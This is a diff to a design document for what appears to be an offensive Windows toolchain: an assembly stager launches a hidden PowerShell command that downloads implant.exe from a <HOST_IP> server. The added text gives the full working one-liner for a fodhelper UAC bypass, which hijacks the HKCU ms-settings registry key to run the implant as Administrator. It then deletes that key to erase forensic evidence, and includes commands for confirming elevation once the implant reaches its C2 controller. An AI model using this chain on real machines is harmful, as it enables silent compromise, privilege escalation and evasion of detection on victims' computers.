@@ -12,12 +12,14 @@ The stager solves this by doing the minimum work inside the sandbox:
 2. Parse the PE export table to resolve `WinExec`
 3. Call `WinExec` with an embedded PowerShell command
 
-PowerShell (an unsandboxed process) then downloads and runs `implant.exe` from the file server.
+PowerShell (an unsandboxed process) then downloads `implant.exe`, elevates it to Administrator via a UAC bypass, and executes it.
 
 ```
 stager.asm  →  WinExec(powershell ...)
                    ↓
            powershell downloads implant.exe
+                   ↓
+           fodhelper UAC bypass → implant.exe runs as Administrator
                    ↓
            implant.exe connects to C2
 ```
@@ -109,13 +111,60 @@ Windows x64 ABI requires RSP to be 16-byte aligned at every `call` site. `WinExe
 The embedded command (with HOST_IP substituted by the Makefile):
 
 ```
-powershell -w h -nop -c "(New-Object Net.WebClient).DownloadFile('http://<HOST_IP>:8000/implant.exe','C:\Users\Public\i.exe');Start-Process 'C:\Users\Public\i.exe'"
+powershell -w h -nop -c "
+  (New-Object Net.WebClient).DownloadFile('http://<HOST_IP>:8000/implant.exe','C:\Users\Public\i.exe');
+  New-Item -Force -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Value 'C:\Users\Public\i.exe';
+  New-ItemProperty -Force -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name DelegateExecute -Value '';
+  Start-Process fodhelper.exe;
+  Start-Sleep 3;
+  Remove-Item -Force -Recurse 'HKCU:\Software\Classes\ms-settings'
+"
 ```
 
 - `-w h` — hidden window
 - `-nop` — no profile (faster startup)
 - Downloads `implant.exe` from the file server to `C:\Users\Public\i.exe`
-- Executes it immediately
+- Runs it as Administrator via the fodhelper UAC bypass (see below)
+
+## Privilege Escalation — fodhelper UAC Bypass
+
+The implant runs as Administrator without triggering a UAC prompt. This works as long as the victim user is a member of the local Administrators group (the common case on personal/lab Windows machines).
+
+### Why it works
+
+`fodhelper.exe` (`C:\Windows\System32\fodhelper.exe`) is a Microsoft-signed binary on Windows' auto-elevation whitelist. When it launches, it checks the registry for a shell handler:
+
+```
+HKCU\Software\Classes\ms-settings\shell\open\command
+```
+
+If that key exists and has a `DelegateExecute` value (even empty), Windows considers it a COM activation and launches the default value of that key **in an elevated context** — no UAC prompt shown.
+
+Because the key lives in `HKCU` (the current user's hive), any standard user can write it. Writing a registry key requires no special privileges; triggering `fodhelper` is what causes elevation.
+
+### Step by step
+
+1. **Write registry key** — sets `HKCU:\...\ms-settings\shell\open\command` default value to `C:\Users\Public\i.exe`
+2. **Write DelegateExecute** — empty string value tells Windows to treat this as an auto-elevating COM handler
+3. **Start fodhelper.exe** — fodhelper auto-elevates, reads the key, and launches `i.exe` as Administrator
+4. **Sleep 3 seconds** — gives fodhelper time to read the key and fire before it gets deleted
+5. **Remove-Item** — cleans up the registry key to remove forensic evidence
+
+### Verifying elevation
+
+Once the implant connects to the C2 controller, confirm admin privileges with `RUN_CMD`:
+
+```
+whoami /groups
+```
+Look for `Mandatory Label\High Mandatory Level` — confirms elevation.
+
+Or:
+```
+net session
+```
+- Returns session info → Administrator
+- Returns `Access is denied` → not elevated
 
 ## Why Not Donut?
 
